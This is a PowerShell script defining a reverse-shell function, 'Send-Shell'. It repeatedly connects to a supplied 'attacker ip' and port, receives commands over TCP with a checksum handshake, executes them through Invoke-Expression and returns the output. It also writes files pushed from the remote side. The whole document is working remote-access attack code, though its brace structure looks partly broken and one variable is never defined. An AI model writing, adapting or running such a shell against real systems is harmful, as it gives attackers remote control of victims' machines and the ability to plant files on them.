function Send-Shell
{
    param(
      [string]$i,
      [int]$p,
      [int]$wp
    )
    if(-not($i)) {
        echo ""
        echo "[-] You must supply a value for -i (attacker ip)"
        echo "[*] Example use: Send-Shell -i 10.0.2.11 -p 9001"
        stop-process (Get-Process -PID $pid).ID -Force 2>&1
        }
    if(-not($p)) {
        echo ""
        echo "[-] You must supply a value for -p (port for reverse shell)"
        echo "[*] Example use: Send-Shell -i 10.0.2.11 -p 9001"
        stop-process (Get-Process -PID $pid).ID -Force 2>&1
        }
    do {
        try{
            $TCPClient = New-Object Net.Sockets.TCPClient($i, $p)
        } catch {}
    } until ($TCPClient.Connected)

    $NetworkStream = $TCPClient.GetStream()
    $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
    #$StreamWriter.AutoFlush = $true

    $BUF_SIZE = 1024
    $buffer = New-Object Byte[] $BUF_SIZE
    $encoding = New-Object Text.AsciiEncoding

    function receive_data{
        do {
            $data = ""
            while ($true){
                $chunk = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
                $part = $encoding.GetString($buffer, 0, $chunk)
                $data += $part
                if ($part.Length -lt 1024){
                    break
                }
            }
            if ($data.StartsWith('[CHECKSUM]')){
                try{
                    if ($Data.Split(' ')[1] -eq $sum){
                        $StreamWriter.Write('[OKSUM]')
                        $StreamWriter.Flush()
                        return $cmd
                        break
                    }else{
                        $StreamWriter.Write('[ERROR]')
                        $StreamWriter.Flush()
                    }
                }catch{
                    $StreamWriter.Write('[ERROR]')
                    $StreamWriter.Flush()
                }
            }else{
                try{
                    if ($data.Contains("[CHECKSUM]")){
                        $StreamWriter.Write('[ERROR]')
                        $StreamWriter.Flush()
                    }else{
                        $cmd = $data
                        $mystream = [IO.MemoryStream]::new([byte[]][char[]]$cmd)
                        $sum = (Get-FileHash -InputStream $mystream -Algorithm MD5).Hash
                        $mystream.dispose()
                        Remove-Variable mystream
                        $StreamWriter.Write('[OKCMD]')
                        $StreamWriter.Flush()
                    }
                }catch{
                    $StreamWriter.Write('[ERROR]')
                    $StreamWriter.Flush()
                }
            }
            #start-sleep -Milliseconds 1
        }while ($True -and $TCPClient.Connected)
    }

    while ($TCPClient.Connected){
        $cmd = receive_data
        if ($cmd.StartsWith('[DOWN]')){
            try {
                $finish = $false
                if ($cmd.Contains('[CLOSE]')){
                    $finish = $true
                }
                if (!$fs){
                    $fs = New-Object IO.FileStream $file ,'Append','Write','Read'
                }
                [string[]] $bytes = $cmd.SubString(15).Split(',')
                foreach ($b in $bytes){
                    $fs.WriteByte([int]$b)
                }
                if ($finish){
                    $StreamWriter.WriteLine('[+] Downloaded Successfully!')
                    $StreamWriter.Flush()
                    $fs.close()
                    $cmd = ' '
                    Remove-Variable fs, bytes, finish, b
                }
                $StreamWriter.WriteLine(' ')
                $StreamWriter.Flush()
            }catch{
                #$fs.close()
                #Remove-Variable fs, bytes, b, app
                $message = $_
                write-host $message
                $StreamWriter.WriteLine('[-] Failed to download %s :'+$message)
                $StreamWriter.Flush()
                continue
            }

        $Output = try {
                        $out = Invoke-Expression $cmd 2>&1 | Out-String
                            if ($out.Length -gt 0){
                                '[+] ' + $out
                            }else{
                                ' '
                            }
                        } catch {
                            $out = $_ | Out-String
                            '[-] ' + $out
                        }
        $StreamWriter.WriteLine($Output)#!
        $StreamWriter.Flush()
    }
    $StreamWriter.Close()
}
